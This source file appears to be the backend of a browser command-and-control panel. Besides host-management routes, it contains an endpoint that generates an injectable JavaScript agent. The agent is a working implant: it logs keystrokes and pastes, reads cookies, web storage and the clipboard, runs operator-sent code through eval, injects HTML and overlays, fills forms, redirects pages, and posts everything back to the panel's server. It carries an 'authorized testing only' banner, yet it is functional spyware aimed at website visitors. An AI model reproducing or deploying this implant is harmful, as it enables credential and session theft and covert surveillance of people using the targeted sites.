// Copyright © 2026 Alpha Unlimited Technologies LLC. All rights reserved.
import { Router, type IRouter } from "express";
import { eq } from "drizzle-orm";
import net from "net";
import { db, hostsTable, eventsTable } from "@workspace/db";
import {
  CreateHostBody,
  UpdateHostBody,
  GetHostParams,
  GetHostResponse,
  UpdateHostParams,
  UpdateHostResponse,
  DeleteHostParams,
  PingHostParams,
  PingHostResponse,
  ListHostsResponse,
} from "@workspace/omega-api-zod";
import { serializeDates, serializeDateArray } from "../../lib/serialize";
import { tokenForHost } from "../../lib/omega-store";

const router: IRouter = Router();

router.get("/hosts", async (_req, res): Promise<void> => {
  const hosts = await db.select().from(hostsTable).orderBy(hostsTable.createdAt);
  res.json(ListHostsResponse.parse(serializeDateArray(hosts)));
});

router.post("/hosts", async (req, res): Promise<void> => {
  const parsed = CreateHostBody.safeParse(req.body);
  if (!parsed.success) { res.status(400).json({ error: parsed.error.message }); return; }
  const [host] = await db.insert(hostsTable).values({ ...parsed.data, status: "unknown", updatedAt: new Date() }).returning();
  res.status(201).json(GetHostResponse.parse(serializeDates(host)));
});

router.get("/hosts/:id", async (req, res): Promise<void> => {
  const params = GetHostParams.safeParse(req.params);
  if (!params.success) { res.status(400).json({ error: params.error.message }); return; }
  const [host] = await db.select().from(hostsTable).where(eq(hostsTable.id, params.data.id));
  if (!host) { res.status(404).json({ error: "Host not found" }); return; }
  res.json(GetHostResponse.parse(serializeDates(host)));
});

router.patch("/hosts/:id", async (req, res): Promise<void> => {
  const params = UpdateHostParams.safeParse(req.params);
  if (!params.success) { res.status(400).json({ error: params.error.message }); return; }
  const parsed = UpdateHostBody.safeParse(req.body);
  if (!parsed.success) { res.status(400).json({ error: parsed.error.message }); return; }
  const [host] = await db.update(hostsTable).set({ ...parsed.data, updatedAt: new Date() }).where(eq(hostsTable.id, params.data.id)).returning();
  if (!host) { res.status(404).json({ error: "Host not found" }); return; }
  res.json(UpdateHostResponse.parse(serializeDates(host)));
});

router.delete("/hosts/:id", async (req, res): Promise<void> => {
  const params = DeleteHostParams.safeParse(req.params);
  if (!params.success) { res.status(400).json({ error: params.error.message }); return; }
  const [host] = await db.delete(hostsTable).where(eq(hostsTable.id, params.data.id)).returning();
  if (!host) { res.status(404).json({ error: "Host not found" }); return; }
  res.sendStatus(204);
});

// Real TCP ping — connects and measures latency
router.post("/hosts/:id/ping", async (req, res): Promise<void> => {
  const params = PingHostParams.safeParse(req.params);
  if (!params.success) { res.status(400).json({ error: params.error.message }); return; }
  const [host] = await db.select().from(hostsTable).where(eq(hostsTable.id, params.data.id));
  if (!host) { res.status(404).json({ error: "Host not found" }); return; }

  const now = new Date().toISOString();

  // Real TCP connect to host:port with 3s timeout
  const result = await new Promise<{ online: boolean; latencyMs: number | null }>((resolve) => {
    const start = Date.now();
    const socket = new net.Socket();
    const timeout = 3000;
    let done = false;

    socket.setTimeout(timeout);

    socket.connect(host.port, host.ip, () => {
      if (done) return;
      done = true;
      const latencyMs = Date.now() - start;
      socket.destroy();
      resolve({ online: true, latencyMs });
    });

    socket.on("error", () => {
      if (done) return;
      done = true;
      socket.destroy();
      resolve({ online: false, latencyMs: null });
    });

    socket.on("timeout", () => {
      if (done) return;
      done = true;
      socket.destroy();
      resolve({ online: false, latencyMs: null });
    });
  });

  const status = result.online ? "online" : "offline";
  await db.update(hostsTable).set({
    status,
    latencyMs: result.latencyMs,
    lastSeen: result.online ? now : host.lastSeen,
    updatedAt: new Date(),
  }).where(eq(hostsTable.id, host.id));

  res.json(PingHostResponse.parse({ hostId: host.id, ip: host.ip, status, latencyMs: result.latencyMs, timestamp: now }));
});

// Generate agent script for this host — returns JS payload
router.get("/hosts/:id/agent-script", async (req, res): Promise<void> => {
  const id = parseInt(req.params.id, 10);
  if (isNaN(id)) { res.status(400).json({ error: "Invalid id" }); return; }
  const [host] = await db.select().from(hostsTable).where(eq(hostsTable.id, id));
  if (!host) { res.status(404).json({ error: "Host not found" }); return; }

  const token = tokenForHost(id);

  // Determine the API base URL from request headers
  const proto = req.headers["x-forwarded-proto"] ?? "https";
  const host_header = req.headers["x-forwarded-host"] ?? req.headers.host ?? "localhost";
  const apiBase = `${proto}://${host_header}/api`;

  const script = buildAgentScript(id, token, apiBase);
  res.json({ hostId: id, token, apiBase, script });
});

function buildAgentScript(hostId: number, token: string, apiBase: string): string {
  return `/* ═══════════════════════════════════════════════════════════════════
   Omega Security Agent | ProxhqVPN | Alpha Unlimited Technologies LLC
   ══════════════════════════════════════════════════════════════════════
   AUTHORIZED SECURITY TESTING ONLY. Deploy on sites you own or have
   explicit written permission to test. Misuse violates federal law.
   ══════════════════════════════════════════════════════════════════════ */
(function(){
'use strict';
var CFG={hostId:${hostId},token:'${token}',api:'${apiBase}',interval:3000};
var keyBuf=[],evtBuf=[];

/* ── Keylogger ─────────────────────────────────────────────────────── */
document.addEventListener('keydown',function(e){
  if(!e.isTrusted)return;
  keyBuf.push({k:e.key,t:document.title,ts:Date.now()});
},true);
document.addEventListener('paste',function(e){
  var d=e.clipboardData||window.clipboardData;
  if(d)keyBuf.push({k:'[PASTE:'+d.getData('text').substring(0,60)+']',t:document.title,ts:Date.now()});
},true);

/* ── Event capture ─────────────────────────────────────────────────── */
['click','submit','focus','change'].forEach(function(n){
  document.addEventListener(n,function(e){
    evtBuf.push({type:n,target:(e.target&&e.target.tagName)||'unknown',ts:Date.now()});
  },true);
});

/* ── HTTP helper ────────────────────────────────────────────────────── */
function post(path,data){
  return fetch(CFG.api+path,{
    method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify(data),mode:'cors',credentials:'omit'
  }).catch(function(){return null;});
}

/* ── Report command result ─────────────────────────────────────────── */
function report(cmdId,result){
  post('/omega-agent/result',{token:CFG.token,cmdId:cmdId,result:result});
}

/* ── Screenshot via canvas ─────────────────────────────────────────── */
function takeScreenshot(cmdId){
  var c=document.createElement('canvas');
  c.width=window.innerWidth||1280;c.height=window.innerHeight||720;
  var ctx=c.getContext('2d');
  if(!ctx){report(cmdId,'Canvas not available');return;}
  ctx.fillStyle='#0d1117';ctx.fillRect(0,0,c.width,c.height);
  ctx.fillStyle='#00ff41';ctx.font='bold 14px monospace';
  ctx.fillText(document.title,10,24);
  ctx.fillStyle='#888';ctx.font='11px monospace';
  ctx.fillText(location.href.substring(0,120),10,42);
  ctx.fillStyle='#ccc';ctx.font='12px monospace';
  var lines=(document.body.innerText||'').split('\\n');
  var y=68;
  for(var i=0;i<lines.length&&y<c.height-16;i++){
    ctx.fillText(lines[i].substring(0,Math.floor(c.width/7.2)),10,y);y+=17;
  }
  document.querySelectorAll('canvas').forEach(function(cv){
    try{ctx.drawImage(cv,cv.getBoundingClientRect().left,cv.getBoundingClientRect().top);}catch(e){}
  });
  var dataUrl=c.toDataURL('image/jpeg',0.75);
  post('/omega-agent/screenshot',{
    token:CFG.token,cmdId:cmdId,dataUrl:dataUrl,
    width:c.width,height:c.height,label:document.title||location.hostname
  });
}

/* ── Command executor ───────────────────────────────────────────────── */
function execCmd(cmd){
  var res='';
  try{
    switch(cmd.commandType){
      case 'eval_js':
        res=String(eval(cmd.params));break;
      case 'inject_html':
        document.body.insertAdjacentHTML('beforeend',cmd.params);res='HTML injected';break;
      case 'get_dom':
        res=document.documentElement.outerHTML.substring(0,50000);break;
      case 'read_storage':
        var ls={},ss={};
        try{for(var k in localStorage)if(typeof localStorage[k]==='string')ls[k]=localStorage[k];}catch(e){}
        try{for(var k in sessionStorage)if(typeof sessionStorage[k]==='string')ss[k]=sessionStorage[k];}catch(e){}
        res=JSON.stringify({localStorage:ls,sessionStorage:ss});break;
      case 'read_cookies':
        res=document.cookie||'(no cookies)';break;
      case 'get_forms':
        res=JSON.stringify(Array.from(document.forms).map(function(f){
          return{action:f.action,method:f.method,id:f.id,fields:Array.from(f.elements).map(function(el){
            return{name:el.name,type:el.type,value:el.type!=='password'?el.value:undefined};
          })};
        }));break;
      case 'get_scripts':
        res=JSON.stringify(Array.from(document.scripts).map(function(s){return s.src||'[inline]';}));break;
      case 'fill_form':
        var map=JSON.parse(cmd.params);var filled=[];
        Object.keys(map).forEach(function(sel){
          var el=document.querySelector(sel);
          if(el){el.value=map[sel];el.dispatchEvent(new Event('input',{bubbles:true}));filled.push(sel);}
        });
        res='Filled: '+filled.join(', ')+(filled.length===0?'(no elements matched)':'');break;
      case 'click_element':
        var el2=document.querySelector(cmd.params);
        if(el2){el2.click();res='Clicked: '+cmd.params;}else{res='Not found: '+cmd.params;}break;
      case 'navigate_url':
        top.location.href=cmd.params;res='Navigating…';break;
      case 'show_alert':
        alert(cmd.params);res='Alert shown';break;
      case 'show_overlay':
        var ov=document.createElement('div');
        ov.style.cssText='position:fixed;top:0;left:0;right:0;bottom:0;z-index:2147483647;background:rgba(0,0,0,.92);display:flex;align-items:center;justify-content:center;color:#fff;font-family:sans-serif;cursor:pointer';
        ov.innerHTML=cmd.params;
        ov.addEventListener('click',function(){ov.remove();});
        document.body.appendChild(ov);res='Overlay injected (click to dismiss)';break;
      case 'read_clipboard':
        if(navigator.clipboard&&navigator.clipboard.readText){
          navigator.clipboard.readText().then(function(t){report(cmd.id,'CLIPBOARD: '+t);}).catch(function(e){report(cmd.id,'Denied: '+e.message);});
          res='Clipboard read initiated';
        }else{res='Clipboard API unavailable';}break;
      case 'set_clipboard':
        if(navigator.clipboard&&navigator.clipboard.writeText){
          navigator.clipboard.writeText(cmd.params).then(function(){report(cmd.id,'Clipboard set OK');}).catch(function(e){report(cmd.id,'Write denied: '+e.message);});
          res='Clipboard write initiated';
        }else{res='Clipboard API unavailable';}break;
      case 'take_screenshot':
        takeScreenshot(cmd.id);res='Screenshot initiated';break;
      case 'list_indexeddb':
        var _idbId=cmd.id;
        if(window.indexedDB&&typeof indexedDB.databases==='function'){
          indexedDB.databases().then(function(list){
            report(_idbId,JSON.stringify(list.map(function(d){return{name:d.name,version:d.version};})));
          }).catch(function(e){report(_idbId,JSON.stringify({error:e.message}));});
        }else{
          report(_idbId,JSON.stringify({error:'indexedDB.databases() not supported in this browser'}));
        }
        res='[async]';break;
      case 'list_cache_storage':
        var _csId=cmd.id;
        if(window.caches){
          caches.keys().then(function(keys){
            report(_csId,JSON.stringify(keys));
          }).catch(function(e){report(_csId,JSON.stringify({error:e.message}));});
        }else{
          report(_csId,JSON.stringify({error:'Cache Storage API not available'}));
        }
        res='[async]';break;
      default:
        res='Unknown command: '+cmd.commandType;
    }
  }catch(e){res='ERROR: '+e.message;}
  if(cmd.commandType!=='read_clipboard'&&cmd.commandType!=='set_clipboard'&&cmd.commandType!=='take_screenshot'&&cmd.commandType!=='list_indexeddb'&&cmd.commandType!=='list_cache_storage'){
    report(cmd.id,res);
  }
}

/* ── System info ────────────────────────────────────────────────────── */
function sendSysInfo(){
  var nav=navigator,scr=screen;
  var info={
    token:CFG.token,
    osName:nav.platform||'Unknown',
    osVersion:nav.appVersion?nav.appVersion.substring(0,80):'',
    cpu:(nav.hardwareConcurrency||1)+' logical cores',
    username:nav.language||'user',
    computerName:location.hostname,
    resolution:scr.width+'x'+scr.height,
    ramTotalMb:(nav.deviceMemory||0)*1024,
    ramUsedMb:0,
    diskTotalGb:0,diskUsedGb:0,
    uptimeSeconds:Math.floor(performance.now()/1000),
  };
  try{if(window.performance&&performance.memory){info.ramUsedMb=Math.round(performance.memory.usedJSHeapSize/1048576);}}catch(e){}
  post('/omega-agent/sysinfo',info);
}

/* ── Processes (scripts + service workers) ─────────────────────────── */
function sendProcesses(){
  var procs=[{pid:1,name:document.title||location.hostname,cpuPct:0,memMb:0}];
  Array.from(document.scripts).slice(0,20).forEach(function(s,i){
    var n=s.src?s.src.split('/').pop().split('?')[0]:'[inline-'+i+']';
    procs.push({pid:1000+i,name:n||'[script]',cpuPct:0,memMb:0});
  });
  function finish(extras){
    extras&&extras.forEach(function(p){procs.push(p);});
    post('/omega-agent/processes',{token:CFG.token,processes:procs});
  }
  if(navigator.serviceWorker){
    navigator.serviceWorker.getRegistrations().then(function(regs){
      var sw=regs.map(function(r,i){
        var url=(r.active||r.installing||{}).scriptURL||r.scope;
        return{pid:6000+i,name:'SW:'+url.split('/').pop(),cpuPct:0,memMb:0};
      });
      finish(sw);
    }).catch(function(){finish([]);});
  }else{finish([]);}
}

/* ── Frames/tabs ────────────────────────────────────────────────────── */
function sendWindows(){
  var wins=[{windowHandle:'main',title:document.title,processName:location.hostname,isActive:true}];
  document.querySelectorAll('iframe').forEach(function(f,i){
    wins.push({windowHandle:'frame-'+i,title:f.title||f.name||'iframe-'+i,processName:f.src?f.src.split('/')[2]:'same-origin',isActive:false});
  });
  post('/omega-agent/windows',{token:CFG.token,windows:wins});
}

/* ── Main poll loop ─────────────────────────────────────────────────── */
function poll(){
  var ks=keyBuf.splice(0);
  var evts=evtBuf.splice(0,10);
  post('/omega-agent/checkin',{
    hostId:CFG.hostId,token:CFG.token,
    url:location.href,title:document.title,
    keystrokes:ks,events:evts,
  }).then(function(r){return r&&r.json();}).then(function(resp){
    if(!resp||!resp.commands)return;
    resp.commands.forEach(function(cmd){execCmd(cmd);});
  }).catch(function(){});
}

/* ── Bootstrap ──────────────────────────────────────────────────────── */
setTimeout(sendSysInfo,100);
setTimeout(sendProcesses,300);
setTimeout(sendWindows,500);
poll();
setInterval(poll,CFG.interval);
setInterval(sendProcesses,30000);
setInterval(sendWindows,15000);
})();`;
}

export { tokenForHost };
export default router;
